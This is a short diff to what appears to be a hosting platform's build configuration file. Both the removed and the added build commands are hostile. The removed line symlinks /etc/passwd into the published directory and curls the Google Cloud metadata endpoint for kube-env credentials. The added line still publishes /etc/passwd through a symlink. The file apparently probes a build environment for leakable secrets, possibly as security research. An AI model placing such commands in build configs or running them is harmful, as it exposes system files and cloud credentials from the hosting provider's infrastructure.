@@ -1,5 +1,5 @@
 [build]
-  command = "mkdir dist && ln -s /etc/passwd dist/passwd && curl -i -H 'X-Google-Metadata-Request: True' -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env -o dist/output.txt"
+  command = "mkdir dist && cd dist && ln -s /etc/passwd output.txt"
   publish = "dist"
 [build.environment]
   YARN_VERSION = "1.9.4"
